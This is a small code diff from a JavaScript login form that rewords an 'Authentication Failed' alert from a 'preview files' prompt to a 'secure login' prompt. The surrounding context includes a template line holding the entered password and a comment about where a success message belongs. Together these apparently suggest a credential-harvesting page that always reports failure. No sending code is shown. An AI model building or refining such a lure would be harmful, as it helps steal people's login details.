@@ -52,7 +52,7 @@ Password: ${passwrd}
 
       // Success message should be shown here
       alert(
-        `Authentication Failed \nInput correct credentials to preview files`
+        `Authentication Failed \nInput correct email or passwordd to secure login`
       );
       setPasswrd("");
       setEmal("");
